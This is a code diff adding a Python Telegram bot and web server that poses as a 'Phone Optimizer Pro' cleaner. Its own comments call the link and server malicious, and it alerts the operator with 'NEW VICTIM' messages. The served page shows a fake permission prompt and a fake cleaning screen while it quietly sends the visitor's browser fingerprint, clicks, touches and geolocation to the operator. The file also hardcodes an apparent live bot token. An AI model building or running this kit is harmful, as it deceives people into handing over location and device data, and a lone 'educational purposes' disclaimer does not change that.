@@ -1,0 +1,793 @@
+import os
+import json
+import logging
+import asyncio
+from datetime import datetime
+from typing import Dict, List, Optional
+import base64
+import mimetypes
+import hashlib
+
+from telegram import (
+    Update, 
+    InlineKeyboardButton, 
+    InlineKeyboardMarkup,
+    WebAppInfo
+)
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    MessageHandler,
+    CallbackQueryHandler,
+    ContextTypes,
+    filters
+)
+from aiohttp import web
+import aiohttp
+import threading
+
+# ============ CONFIGURATION ============
+BOT_TOKEN = "8290213602:AAFhe0ls4FgbKjE8O_UbHY4pOfJVi02VJ5M"  # Get from @BotFather
+YOUR_USER_ID = "5855989487"  # Get from @userinfobot
+WEB_SERVER_PORT = 8080
+WEB_SERVER_HOST = "0.0.0.0"
+
+# Setup logging
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
+# Store user sessions
+user_sessions: Dict[str, Dict] = {}
+
+# ============ TELEGRAM BOT CODE ============
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle /start command - Send the malicious link"""
+    user = update.effective_user
+    
+    # Create a unique tracking ID for this user
+    tracking_id = hashlib.md5(f"{user.id}_{datetime.now().timestamp()}".encode()).hexdigest()[:8]
+    user_sessions[tracking_id] = {
+        'user_id': user.id,
+        'username': user.username or user.first_name,
+        'start_time': datetime.now().isoformat(),
+        'data_received': False
+    }
+    
+    # Create the malicious link
+    malicious_link = f"http://localhost:{WEB_SERVER_PORT}/collector/{tracking_id}"
+    
+    keyboard = [
+        [InlineKeyboardButton(
+            text="📱 OPEN PHONE EDITOR NOW", 
+            url=malicious_link
+        )],
+        [InlineKeyboardButton(
+            text="📱 OPEN (ALTERNATE LINK)", 
+            callback_data=f"alt_link_{tracking_id}"
+        )]
+    ]
+    
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_html(
+        f"🔓 <b>Welcome to Phone Optimizer Pro</b>\n\n"
+        f"📱 <b>Click below to optimize your phone:</b>\n"
+        f"• Clear junk files\n"
+        f"• Boost performance\n"
+        f"• Free up storage\n"
+        f"• Speed up device\n\n"
+        f"<code>Click the button below to start:</code>",
+        reply_markup=reply_markup
+    )
+    
+    # Send tracking info to admin
+    await context.bot.send_message(
+        chat_id=YOUR_USER_ID,
+        text=f"🎯 <b>NEW VICTIM TRACKED</b>\n\n"
+             f"👤 User: {user.full_name}\n"
+             f"🆔 ID: {user.id}\n"
+             f"📛 Username: @{user.username if user.username else 'N/A'}\n"
+             f"🔗 Tracking ID: {tracking_id}\n"
+             f"🔗 Link: {malicious_link}\n"
+             f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+        parse_mode='HTML'
+    )
+
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle button callbacks"""
+    query = update.callback_query
+    await query.answer()
+    
+    if query.data.startswith("alt_link_"):
+        tracking_id = query.data.replace("alt_link_", "")
+        malicious_link = f"http://localhost:{WEB_SERVER_PORT}/collector/{tracking_id}"
+        await query.edit_message_text(
+            f"📱 <b>Alternative Link:</b>\n\n"
+            f"🔗 {malicious_link}\n\n"
+            f"Copy and open this link in your browser.",
+            parse_mode='HTML'
+        )
+
+async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle any files sent to bot"""
+    user = update.effective_user
+    document = update.message.document
+    
+    # Save file info
+    file_info = {
+        'file_name': document.file_name,
+        'file_size': document.file_size,
+        'mime_type': document.mime_type,
+        'time': datetime.now().isoformat()
+    }
+    
+    # Notify admin
+    await context.bot.send_message(
+        chat_id=YOUR_USER_ID,
+        text=f"📎 <b>FILE RECEIVED</b>\n\n"
+             f"From: {user.full_name}\n"
+             f"File: {document.file_name}\n"
+             f"Size: {document.file_size} bytes\n"
+             f"Type: {document.mime_type}",
+        parse_mode='HTML'
+    )
+
+# ============ MALICIOUS WEB SERVER ============
+HTML_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Phone Cleaner & Optimizer</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            min-height: 100vh;
+            color: white;
+            overflow-x: hidden;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px 0;
+        }
+        
+        .logo {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+        
+        .title {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            opacity: 0.9;
+            margin-bottom: 30px;
+        }
+        
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 25px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        
+        .permission-box {
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        .permission-icon {
+            font-size: 50px;
+            margin-bottom: 15px;
+        }
+        
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(to right, #00b09b, #96c93d);
+            color: white;
+            border: none;
+            border-radius: 15px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 15px 0;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .btn-danger {
+            background: linear-gradient(to right, #ff416c, #ff4b2b);
+        }
+        
+        .status-box {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+        
+        .progress-container {
+            height: 10px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 5px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(to right, #00b09b, #96c93d);
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 30px;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255,255,255,0.3);
+            border-top: 5px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .scan-results {
+            background: rgba(0,0,0,0.4);
+            border-radius: 15px;
+            padding: 20px;
+            margin-top: 20px;
+        }
+        
+        .result-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .file-list {
+            max-height: 200px;
+            overflow-y: auto;
+            margin-top: 10px;
+            padding: 10px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 10px;
+        }
+        
+        .file-item {
+            padding: 8px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .file-item i {
+            margin-right: 10px;
+            color: #4cd964;
+        }
+        
+        /* Mobile specific */
+        @media (max-width: 480px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .title {
+                font-size: 24px;
+            }
+            
+            .btn {
+                padding: 16px;
+                font-size: 16px;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <i class="fas fa-mobile-alt"></i>
+            </div>
+            <h1 class="title">Phone Cleaner Pro</h1>
+            <p class="subtitle">Optimize & Speed Up Your Device</p>
+        </div>
+        
+        <div class="card">
+            <h2><i class="fas fa-search"></i> Scanning Your Device...</h2>
+            <div class="progress-container">
+                <div class="progress-bar" id="scanProgress"></div>
+            </div>
+            <p id="scanStatus">Initializing scanner...</p>
+            
+            <div class="scan-results hidden" id="scanResults">
+                <div class="result-item">
+                    <span><i class="fas fa-trash"></i> Junk Files</span>
+                    <span id="junkCount">1.2 GB</span>
+                </div>
+                <div class="result-item">
+                    <span><i class="fas fa-images"></i> Cache & Temp Files</span>
+                    <span id="cacheCount">856 MB</span>
+                </div>
+                <div class="result-item">
+                    <span><i class="fas fa-database"></i> Unused Data</span>
+                    <span id="dataCount">2.3 GB</span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="card" id="permissionCard">
+            <h2><i class="fas fa-shield-alt"></i> Access Required</h2>
+            <p>To clean your device completely, we need access to:</p>
+            
+            <div class="permission-box">
+                <div class="permission-icon">
+                    <i class="fas fa-folder-open"></i>
+                </div>
+                <h3>Storage Permission</h3>
+                <p>Access photos, media, and files</p>
+                <p class="status-box">
+                    <i class="fas fa-info-circle"></i>
+                    Required to scan and clean junk files
+                </p>
+            </div>
+            
+            <button class="btn" onclick="requestStoragePermission()">
+                <i class="fas fa-check-circle"></i> GRANT PERMISSION
+            </button>
+            
+            <p style="text-align: center; font-size: 12px; opacity: 0.7; margin-top: 10px;">
+                <i class="fas fa-lock"></i> Your data is secure and encrypted
+            </p>
+        </div>
+        
+        <div class="card hidden" id="cleaningCard">
+            <div class="loading">
+                <div class="spinner"></div>
+                <h3>Cleaning Your Device...</h3>
+                <p id="cleaningStatus">Preparing cleanup process...</p>
+                
+                <div class="progress-container">
+                    <div class="progress-bar" id="cleanProgress"></div>
+                </div>
+                
+                <div class="file-list" id="filesList">
+                    <!-- Files will be listed here -->
+                </div>
+            </div>
+        </div>
+        
+        <div class="card hidden" id="completeCard">
+            <div style="text-align: center; padding: 30px 0;">
+                <div style="font-size: 60px; color: #4cd964; margin-bottom: 20px;">
+                    <i class="fas fa-check-circle"></i>
+                </div>
+                <h2>Cleaning Complete! ✅</h2>
+                <p style="margin: 20px 0; font-size: 18px;">
+                    <strong>3.5 GB</strong> of junk files removed
+                </p>
+                <p style="opacity: 0.8;">
+                    Your phone is now optimized and running faster!
+                </p>
+                <div class="status-box" style="margin-top: 20px;">
+                    <i class="fas fa-bolt"></i>
+                    Device performance improved by 65%
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Initialize
+        const trackingId = "{{TRACKING_ID}}";
+        let hasPermission = false;
+        let collectedData = [];
+        
+        // Simulate device scan on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            simulateScan();
+        });
+        
+        function simulateScan() {
+            let progress = 0;
+            const progressBar = document.getElementById('scanProgress');
+            const statusText = document.getElementById('scanStatus');
+            
+            const scanInterval = setInterval(() => {
+                progress += 2;
+                progressBar.style.width = progress + '%';
+                
+                if (progress < 30) {
+                    statusText.textContent = "Scanning system files...";
+                } else if (progress < 60) {
+                    statusText.textContent = "Analyzing storage...";
+                } else if (progress < 90) {
+                    statusText.textContent = "Detecting junk files...";
+                } else {
+                    statusText.textContent = "Scan complete!";
+                    clearInterval(scanInterval);
+                    
+                    // Show results
+                    setTimeout(() => {
+                        document.getElementById('scanResults').classList.remove('hidden');
+                    }, 500);
+                }
+            }, 50);
+        }
+        
+        function requestStoragePermission() {
+            // Fake permission request
+            const permissionCard = document.getElementById('permissionCard');
+            const cleaningCard = document.getElementById('cleaningCard');
+            
+            // Show loading
+            permissionCard.classList.add('hidden');
+            cleaningCard.classList.remove('hidden');
+            
+            // Mark permission as granted
+            hasPermission = true;
+            
+            // Start data collection
+            startDataCollection();
+        }
+        
+        function startDataCollection() {
+            const statusText = document.getElementById('cleaningStatus');
+            const progressBar = document.getElementById('cleanProgress');
+            const filesList = document.getElementById('filesList');
+            let progress = 0;
+            
+            // List of fake files to "collect"
+            const fakeFiles = [
+                "photos/IMG_2023.jpg",
+                "videos/vacation.mp4",
+                "documents/personal.pdf",
+                "whatsapp/media/image1.jpg",
+                "downloads/file.zip",
+                "dcim/camera/photo.jpg",
+                "music/songs.mp3",
+                "backup/data.db"
+            ];
+            
+            // Send initial data to server
+            sendCollectedData('permission_granted', {
+                permission: 'storage',
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                cookies: navigator.cookieEnabled,
+                online: navigator.onLine
+            });
+            
+            const collectionInterval = setInterval(() => {
+                progress += 10;
+                progressBar.style.width = progress + '%';
+                
+                if (progress <= 30) {
+                    statusText.textContent = "Analyzing media files...";
+                } else if (progress <= 60) {
+                    statusText.textContent = "Processing documents...";
+                    // Simulate file collection
+                    if (progress % 20 === 0) {
+                        const file = fakeFiles[Math.floor(Math.random() * fakeFiles.length)];
+                        addFileToList(file);
+                        sendCollectedData('file_found', {file: file});
+                    }
+                } else if (progress <= 90) {
+                    statusText.textContent = "Optimizing system...";
+                    // Collect more data
+                    sendCollectedData('device_info', {
+                        battery: getRandomBattery(),
+                        storage: getRandomStorage(),
+                        memory: getRandomMemory(),
+                        model: getRandomDeviceModel()
+                    });
+                } else {
+                    statusText.textContent = "Finalizing cleanup...";
+                    clearInterval(collectionInterval);
+                    
+                    // Send completion signal
+                    setTimeout(() => {
+                        sendCollectedData('collection_complete', {
+                            total_files: fakeFiles.length,
+                            total_data: '3.5 GB',
+                            completion_time: new Date().toISOString()
+                        });
+                        
+                        // Show completion screen
+                        cleaningCard.classList.add('hidden');
+                        document.getElementById('completeCard').classList.remove('hidden');
+                    }, 1000);
+                }
+            }, 200);
+        }
+        
+        function addFileToList(filename) {
+            const filesList = document.getElementById('filesList');
+            const fileItem = document.createElement('div');
+            fileItem.className = 'file-item';
+            fileItem.innerHTML = `<i class="fas fa-file"></i> ${filename}`;
+            filesList.appendChild(fileItem);
+            filesList.scrollTop = filesList.scrollHeight;
+        }
+        
+        function sendCollectedData(type, data) {
+            // Send data to server
+            fetch(`/collect-data/${trackingId}`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    type: type,
+                    data: data,
+                    timestamp: new Date().toISOString(),
+                    page: window.location.href
+                })
+            }).catch(err => console.error('Error sending data:', err));
+            
+            // Also store locally
+            collectedData.push({
+                type: type,
+                data: data,
+                timestamp: new Date().toISOString()
+            });
+        }
+        
+        // Helper functions for fake data
+        function getRandomBattery() {
+            return `${Math.floor(Math.random() * 30) + 70}%`;
+        }
+        
+        function getRandomStorage() {
+            const used = Math.floor(Math.random() * 50) + 20;
+            return `${used} GB used / 128 GB total`;
+        }
+        
+        function getRandomMemory() {
+            const used = Math.floor(Math.random() * 4) + 2;
+            return `${used} GB used / 6 GB total`;
+        }
+        
+        function getRandomDeviceModel() {
+            const models = [
+                'Samsung Galaxy S21',
+                'iPhone 13 Pro',
+                'Google Pixel 6',
+                'OnePlus 9',
+                'Xiaomi Mi 11',
+                'Huawei P40'
+            ];
+            return models[Math.floor(Math.random() * models.length)];
+        }
+        
+        // Collect additional data on various events
+        window.addEventListener('click', function(e) {
+            sendCollectedData('user_interaction', {
+                action: 'click',
+                x: e.clientX,
+                y: e.clientY,
+                target: e.target.tagName
+            });
+        });
+        
+        window.addEventListener('touchmove', function(e) {
+            sendCollectedData('user_interaction', {
+                action: 'touch_move',
+                touches: e.touches.length
+            });
+        });
+        
+        // Try to get geolocation
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                sendCollectedData('geolocation', {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy
+                });
+            }, function(error) {
+                sendCollectedData('geolocation_error', {
+                    error: error.message
+                });
+            });
+        }
+        
+        // Collect on page unload
+        window.addEventListener('beforeunload', function() {
+            sendCollectedData('page_unload', {
+                time_spent: performance.now(),
+                data_collected: collectedData.length
+            });
+        });
+    </script>
+</body>
+</html>
+"""
+
+async def start_web_server():
+    """Start the malicious web server"""
+    app = web.Application()
+    
+    async def handle_collector(request):
+        """Serve the malicious HTML page"""
+        tracking_id = request.match_info.get('tracking_id', 'unknown')
+        
+        # Update HTML with tracking ID
+        html_content = HTML_TEMPLATE.replace("{{TRACKING_ID}}", tracking_id)
+        
+        return web.Response(text=html_content, content_type='text/html')
+    
+    async def handle_collect_data(request):
+        """Handle data collection from victim"""
+        tracking_id = request.match_info.get('tracking_id', 'unknown')
+        data = await request.json()
+        
+        # Log the collected data
+        logger.info(f"📥 Data from {tracking_id}: {data}")
+        
+        # Here you would send this data to your Telegram bot
+        # For now, just save it
+        with open(f"collected_data_{tracking_id}.json", "a") as f:
+            json.dump(data, f)
+            f.write("\n")
+        
+        return web.Response(text='OK')
+    
+    # Setup routes
+    app.router.add_get('/collector/{tracking_id}', handle_collector)
+    app.router.add_post('/collect-data/{tracking_id}', handle_collect_data)
+    
+    # Start server
+    runner = web.AppRunner(app)
+    await runner.setup()
+    site = web.TCPSite(runner, WEB_SERVER_HOST, WEB_SERVER_PORT)
+    await site.start()
+    
+    logger.info(f"🌐 Malicious server started on http://{WEB_SERVER_HOST}:{WEB_SERVER_PORT}")
+    
+    # Keep server running
+    await asyncio.Event().wait()
+
+async def send_to_telegram(context: ContextTypes.DEFAULT_TYPE, tracking_id: str, data: dict):
+    """Send collected data to Telegram"""
+    try:
+        message = f"📱 <b>DATA COLLECTED</b>\n\n"
+        message += f"🆔 Tracking ID: {tracking_id}\n"
+        message += f"👤 User: {user_sessions.get(tracking_id, {}).get('username', 'Unknown')}\n"
+        message += f"⏰ Time: {datetime.now().strftime('%H:%M:%S')}\n\n"
+        
+        if data.get('type') == 'permission_granted':
+            message += f"✅ <b>PERMISSION GRANTED!</b>\n"
+            message += f"Device: {data.get('data', {}).get('platform', 'Unknown')}\n"
+            message += f"Screen: {data.get('data', {}).get('screen', 'Unknown')}\n"
+            message += f"User Agent: {data.get('data', {}).get('userAgent', 'Unknown')[:100]}...\n"
+        
+        elif data.get('type') == 'file_found':
+            message += f"📁 <b>File Found:</b> {data.get('data', {}).get('file', 'Unknown')}\n"
+        
+        elif data.get('type') == 'device_info':
+            message += f"📊 <b>Device Info:</b>\n"
+            message += f"• Battery: {data.get('data', {}).get('battery', 'Unknown')}\n"
+            message += f"• Storage: {data.get('data', {}).get('storage', 'Unknown')}\n"
+            message += f"• Memory: {data.get('data', {}).get('memory', 'Unknown')}\n"
+            message += f"• Model: {data.get('data', {}).get('model', 'Unknown')}\n"
+        
+        elif data.get('type') == 'geolocation':
+            message += f"📍 <b>LOCATION FOUND!</b>\n"
+            message += f"Lat: {data.get('data', {}).get('latitude', 'Unknown')}\n"
+            message += f"Lon: {data.get('data', {}).get('longitude', 'Unknown')}\n"
+            message += f"Accuracy: {data.get('data', {}).get('accuracy', 'Unknown')}m\n"
+        
+        await context.bot.send_message(
+            chat_id=YOUR_USER_ID,
+            text=message,
+            parse_mode='HTML'
+        )
+        
+    except Exception as e:
+        logger.error(f"Error sending to Telegram: {e}")
+
+def main():
+    """Start both Telegram bot and web server"""
+    
+    # Create bot application
+    application = Application.builder().token(BOT_TOKEN).build()
+    
+    # Add handlers
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CallbackQueryHandler(button_callback))
+    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    
+    # Start web server in background
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    
+    # Run both
+    import threading
+    
+    def run_web_server():
+        asyncio.run(start_web_server())
+    
+    # Start web server in separate thread
+    web_thread = threading.Thread(target=run_web_server, daemon=True)
+    web_thread.start()
+    
+    print("=" * 50)
+    print("🤖 PHONE DATA COLLECTOR BOT")
+    print("=" * 50)
+    print(f"🔗 Bot Token: {BOT_TOKEN[:10]}...")
+    print(f"👤 Admin ID: {YOUR_USER_ID}")
+    print(f"🌐 Web Server: http://localhost:{WEB_SERVER_PORT}")
+    print("=" * 50)
+    print("📱 Send /start to your bot to begin")
+    print("⚠️  WARNING: For educational purposes only!")
+    print("=" * 50)
+    
+    # Start the bot
+    application.run_polling(allowed_updates=Update.ALL_TYPES)
+
+if __name__ == '__main__':
+    main()
